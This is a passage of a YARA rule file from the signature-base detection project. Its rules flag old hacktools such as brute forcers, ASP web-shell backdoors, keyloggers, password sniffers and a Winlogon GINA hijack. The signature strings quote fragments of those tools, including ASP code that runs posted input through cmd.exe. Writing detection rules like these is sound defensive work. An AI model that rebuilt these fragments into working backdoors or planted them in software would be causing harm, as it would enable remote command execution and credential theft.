		hash = "b07702a381fa2eaee40b96ae2443918209674051"
		logic_hash = "77902c7b23bab80d035f1dbe074554f16f99b2c9e31c80171296a1d33f705dac"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:" ascii
		$s1 = "@echo off" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Vubrute_Vubrute
{
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7ac74c85-465c-5eb5-8e91-004f28cabb75"
		date = "2014-11-22"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1456-L1472"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "166fa8c5a0ebb216c832ab61bf8872da556576a7"
		logic_hash = "9dab03b70b249c0c481e3bc98c3196e83da93ea2723674d38baf32469392d52a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Text Files (*.txt);;All Files (*)" fullword ascii
		$s1 = "http://ubrute.com" fullword ascii
		$s11 = "IP - %d; Password - %d; Combination - %d" fullword ascii
		$s14 = "error.txt" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_DK_Brute
{
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c9ea0dcf-10f3-5161-aebc-2db04c24b0a5"
		date = "2014-11-22"
		modified = "2025-04-14"
		reference = "http://goo.gl/xiIphp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1474-L1491"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "93b7c3a01c41baecfbe42461cb455265f33fbc3d"
		logic_hash = "a48ba3513c9c99066e9dda02859089e9e1db15e7bd52443795771609f011c94a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "get_CrackedCredentials" fullword ascii
		$s13 = "Same port used for two different protocols:" fullword wide
		$s18 = "coded by fLaSh" fullword ascii
		$s19 = "get_grbToolsScaningCracking" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Vubrute_Config
{
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
		author = "Florian Roth (Nextron Systems)"
		id = "25cad108-b2d6-5886-bb2f-e614e05649fa"
		date = "2014-11-22"
		modified = "2025-04-14"
		reference = "http://goo.gl/xiIphp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1493-L1513"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b9f66b9265d2370dab887604921167c11f7d93e9"
		logic_hash = "b4c54d5ecb269c7310b5bd2a9e8fe5d6c75503f8cb1f25679399e25185d9cb51"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Restore=1" fullword ascii
		$s6 = "Thread=" ascii
		$s7 = "Running=1" fullword ascii
		$s8 = "CheckCombination=" fullword ascii
		$s10 = "AutoSave=1.000000" fullword ascii
		$s12 = "TryConnect=" ascii
		$s13 = "Tray=" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Hunt
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file hunt.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "5d9d1f99-2f12-51e9-a554-b349e19d00fb"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1515-L1534"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f9f059380d95c7f8d26152b1cb361d93492077ca"
		logic_hash = "66d22c4dc2864d61bd485d6840887905f020fce8e19bb976ec09acaa6ed0387c"
		score = 60
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Programming by JD Glaser - All Rights Reserved" fullword ascii
		$s3 = "Usage - hunt \\\\servername" fullword ascii
		$s4 = ".share = %S - %S" fullword wide
		$s5 = "SMB share enumerator and admin finder " fullword ascii
		$s7 = "Hunt only runs on Windows NT..." fullword ascii
		$s8 = "User = %S" fullword ascii
		$s9 = "Admin is %s\\%s" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Listip
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file listip.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "417faf20-ee07-5c3e-bfcf-89599e38e62e"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1536-L1554"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f32a0c5bf787c10eb494eb3b83d0c7a035e7172b"
		logic_hash = "db5cc21e8c76fdd10953ba0f06c4a1ad319ee522d9def7777dad66612b51edfc"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "ERROR!!! Bad host lookup. Program Terminate." fullword ascii
		$s2 = "ERROR No.2!!! Program Terminate." fullword ascii
		$s4 = "Local Host Name: %s" fullword ascii
		$s5 = "Packed by exe32pack 1.38" fullword ascii
		$s7 = "Local Computer Name: %s" fullword ascii
		$s8 = "Local IP Adress: %s" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Arttrayhookdll
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "324561fc-024c-5583-aa25-6b13e9616898"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1556-L1570"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4867214a3d96095d14aa8575f0adbb81a9381e6c"
		logic_hash = "e43cefdb11df870f4732e74782ecefb94c0a4850c4aa994e4fbc940f523d2434"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "ArtTrayHookDll.dll" fullword ascii
		$s7 = "?TerminateHook@@YAXXZ" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Eee
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file eee.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d3ad3a9-0498-5ca3-ac19-f250cb10c4d3"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1572-L1591"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "236916ce2980c359ff1d5001af6dacb99227d9cb"
		logic_hash = "b12c11f46125a33a2d7d9d02f25762c07b9d5088f70887c000b29e82a7921399"
		score = 60
		quality = 60
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "szj1230@yesky.com" fullword wide
		$s3 = "C:\\Program Files\\DevStudio\\VB\\VB5.OLB" fullword ascii
		$s4 = "MailTo:szj1230@yesky.com" fullword wide
		$s5 = "Command1_Click" fullword ascii
		$s7 = "software\\microsoft\\internet explorer\\typedurls" fullword wide
		$s11 = "vb5chs.dll" fullword ascii
		$s12 = "MSVBVM50.DLL" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Aspbackdoor_Asp4
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp4.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "7718aa71-fc0f-505c-a035-b78ae0438653"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1593-L1613"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "faf991664fd82a8755feb65334e5130f791baa8c"
		logic_hash = "dab19a2b92bbfe17cb860981d7bd5c3f3dd1a9e7c2ac5093fc4117f9205c1c27"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "system.dll" fullword ascii
		$s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
		$s3 = "Public Function reboot(atype As Variant)" fullword ascii
		$s4 = "t& = ExitWindowsEx(1, atype)" ascii
		$s5 = "atype=request(\"atype\") " fullword ascii
		$s7 = "AceiveX dll" fullword ascii
		$s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
		$s10 = "sys.reboot(atype)" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Aspfile1
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file aspfile1.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "1b66dec0-22c8-5937-a0b2-22cbc68241ef"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1615-L1633"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "77b1e3a6e8f67bd6d16b7ace73dca383725ac0af"
		logic_hash = "4968e44f807f8ffface65e21fd8684ccfaee281b4da10f5110482c3f26ccac26"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "' -- check for a command that we have posted -- '" fullword ascii
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
		$s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><BODY>" fullword ascii
		$s6 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
		$s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
		$s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii

	condition:
		3 of them
}

rule SIGNATURE_BASE_Editserver
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "de6bf995-1c7c-561f-98df-e8748d5fb157"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1635-L1657"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "87b29c9121cac6ae780237f7e04ee3bc1a9777d3"
		logic_hash = "6a8f6fcf8f4a0ea5ac114150d7becbd716be0bb40cd45fd5c76a4a8a328e5e40"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "%s Server.exe" fullword ascii
		$s1 = "Service Port: %s" fullword ascii
		$s2 = "The Port Must Been >0 & <65535" fullword ascii
		$s8 = "3--Set Server Port" fullword ascii
		$s9 = "The Server Password Exceeds 32 Characters" fullword ascii
		$s13 = "Service Name: %s" fullword ascii
		$s14 = "Server Password: %s" fullword ascii
		$s17 = "Inject Process Name: %s" fullword ascii
		$x1 = "WinEggDrop Shell Congirator" fullword ascii

	condition:
		5 of ( $s* ) or $x1
}

rule SIGNATURE_BASE_Sig_238_Letmein
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file letmein.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "5dba055f-1928-534a-8d0e-11dda56d93b7"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1659-L1675"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "74d223a56f97b223a640e4139bb9b94d8faa895d"
		logic_hash = "6cf454d11bc806b3a30c52b730994adb8d92613c92849162717f415e5681e417"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Error get globalgroup memebers: NERR_InvalidComputer" fullword ascii
		$s6 = "Error get users from server!" fullword ascii
		$s7 = "get in nt by name and null" fullword ascii
		$s16 = "get something from nt, hold by killusa." fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Token
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file token.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d0ac24b-2078-5455-8d9e-a642c71f7b2d"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1677-L1694"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14"
		logic_hash = "88d7086a48c6a2e3801db75565184b087e663e80e2364765072fc37a5549b8b5"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Logon.exe" fullword ascii
		$s1 = "Domain And User:" fullword ascii
		$s2 = "PID=Get Addr$(): One" fullword ascii
		$s3 = "Process " fullword ascii
		$s4 = "psapi.dllK" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_TELNET
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME"
		author = "Florian Roth (Nextron Systems)"
		id = "fae22e0f-2f69-5dc6-984c-2c07530ad11a"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1696-L1712"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "50d02d77dc6cc4dc2674f90762a2622e861d79b1"
		logic_hash = "4e90d95b7c94933ed5c50f060840291540fc99de0173298b97d2c6ccbf75d26a"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "TELNET [host [port]]" fullword wide
		$s2 = "TELNET.EXE" fullword wide
		$s4 = "Microsoft(R) Windows(R) Millennium Operating System" fullword wide
		$s14 = "Software\\Microsoft\\Telnet" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Snifferport
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file snifferport.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "5b903344-18d2-5d3d-be66-7260a5f3ea4b"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1714-L1731"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d14133b5eaced9b7039048d0767c544419473144"
		logic_hash = "361f1a55ed4bd5a7a5d01d346c4efd1b83e701363484282235b5aab18d3abe1a"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "iphlpapi.DLL" fullword ascii
		$s5 = "ystem\\CurrentCorolSet\\" ascii
		$s11 = "Port.TX" fullword ascii
		$s12 = "32Next" fullword ascii
		$s13 = "V1.2 B" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Sig_238_Webget
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file webget.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "b03a2463-94fe-5050-8e3d-269101a03cda"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1733-L1749"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "36b5a5dee093aa846f906bbecf872a4e66989e42"
		logic_hash = "958c465caddf6436b29042f1f1772e039d011d23ff13d91818a9d7ad21a2c750"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Packed by exe32pack" ascii
		$s1 = "GET A HTTP/1.0" fullword ascii
		$s2 = " error " fullword ascii
		$s13 = "Downloa" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Xyzcmd_Zip_Folder_Xyzcmd
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file XYZCmd.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c3d70b93-1d53-5403-bd22-d1e4bad5042b"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1751-L1767"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bbea5a94950b0e8aab4a12ad80e09b630dd98115"
		logic_hash = "ad0e8f964c7be376236b50ea370de3e433fa9e7b043663d8f32fad06997056ea"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Executes Command Remotely" fullword wide
		$s2 = "XYZCmd.exe" fullword wide
		$s6 = "No Client Software" fullword wide
		$s19 = "XYZCmd V1.0 For NT S" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Aspack_Chinese
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPack Chinese.ini"
		author = "Florian Roth (Nextron Systems)"
		id = "ac821117-7534-5dec-9477-25be87361900"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1769-L1786"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "02a9394bc2ec385876c4b4f61d72471ac8251a8e"
		logic_hash = "98b3af76986cd41190612a2fdfbd9ba48f102456897f4acaedd89a40ab5a582a"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "= Click here if you want to get your registered copy of ASPack" fullword ascii
		$s1 = ";  For beginning of translate - copy english.ini into the yourlanguage.ini" fullword ascii
		$s2 = "E-Mail:                      shinlan@km169.net" fullword ascii
		$s8 = ";  Please, translate text only after simbol '='" fullword ascii
		$s19 = "= Compress with ASPack" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Aspbackdoor_EDIR
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
		author = "Florian Roth (Nextron Systems)"
		id = "0895091a-b620-5746-8245-d44716ec2bbe"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1788-L1805"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "03367ad891b1580cfc864e8a03850368cbf3e0bb"
		logic_hash = "be7d956333107a57a0fd86c69fc9eabcd3d9daf3f66385c44ba246fc2000dc4d"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "response.write \"<a href='index.asp'>" fullword ascii
		$s3 = "if Request.Cookies(\"password\")=\"" ascii
		$s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
		$s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
		$s19 = "whichdir=Request(\"path\")" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassfirewall_Zip_Folder_Ie
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file Ie.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "7bd10fa1-be2d-5882-b4c7-b696612343e5"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1807-L1823"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d1b9058f16399e182c9b78314ad18b975d882131"
		logic_hash = "844e260870f075b0afae0667691e61ab8f138a29871f9a18d1f2b623f9bb9e2a"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "d:\\documents and settings\\loveengeng\\desktop\\source\\bypass\\lcc\\ie.dll" fullword ascii
		$s1 = "LOADER ERROR" fullword ascii
		$s5 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s7 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Editkeylogreadme
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "db083c04-9e5c-5cfd-b4d4-eecf28191b6b"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1825-L1843"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "dfa90540b0e58346f4b6ea12e30c1404e15fbe5a"
		logic_hash = "a58a2336e7d714a2e7f60eec8dacbee9a7190552dd791d8b6eba084ffaf0904a"
		score = 60
		quality = 35
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "editKeyLog.exe KeyLog.exe," fullword ascii
		$s1 = "WinEggDrop.DLL" fullword ascii
		$s2 = "nc.exe" fullword ascii
		$s3 = "KeyLog.exe" fullword ascii
		$s4 = "EditKeyLog.exe" fullword ascii
		$s5 = "wineggdrop" fullword ascii

	condition:
		3 of them
}

rule SIGNATURE_BASE_Passsniffer_Zip_Folder_Readme
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file readme.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "f5965aa8-0f78-56fd-8e3e-6dc013942cb3"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1845-L1860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a52545ae62ddb0ea52905cbb61d895a51bfe9bcd"
		logic_hash = "d9e6cd2ba7e98481664b0560184a07349bb471dd370c4b73ef5f5f05a8e89946"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "PassSniffer.exe" fullword ascii
		$s1 = "POP3/FTP Sniffer" fullword ascii
		$s2 = "Password Sniffer V1.0" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sig_238_Gina
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file gina.reg"
		author = "Florian Roth (Nextron Systems)"
		id = "85c19493-e6d4-55e8-8526-6817243e90cf"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1862-L1877"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "324acc52566baf4afdb0f3e4aaf76e42899e0cf6"
		logic_hash = "f0ece7406a31f5a4212da5c4144233c5c45b8120d09267fdf7e291d6c9827384"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\"gina\"=\"gina.dll\"" fullword ascii
		$s1 = "REGEDIT4" fullword ascii
		$s2 = "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Splitjoin
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "2f1a69cd-34b3-5af0-a054-fe19d9becb25"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1879-L1895"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e4a9ef5d417038c4c76b72b5a636769a98bd2f8c"
		logic_hash = "dede4518ed9be28e89bc67dab4e68503383c16746f088f37a4c8069e256183ca"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Not for distribution without the authors permission" fullword wide
		$s2 = "Utility to split and rejoin files.0" fullword wide
		$s5 = "Copyright (c) Angus Johnson 2001-2002" fullword wide
		$s19 = "SplitJoin" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Editkeylog
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file EditKeyLog.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "db083c04-9e5c-5cfd-b4d4-eecf28191b6b"
		date = "2014-11-23"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-hacktools.yar#L1897-L1913"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a450c31f13c23426b24624f53873e4fc3777dc6b"
		logic_hash = "0efb173598117857c5bf7894f017d655653e843dd0a44439d1b10b7e5c59b248"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Press Any Ke" fullword ascii
		$s2 = "Enter 1 O" fullword ascii
		$s3 = "Bon >0 & <65535L" fullword ascii
		$s4 = "--Choose " fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Passsniffer
{
	meta:
		description = "Disclosed hacktool set (old stuff) - file PassSniffer.exe"
		author = "Florian Roth (Nextron Systems)"
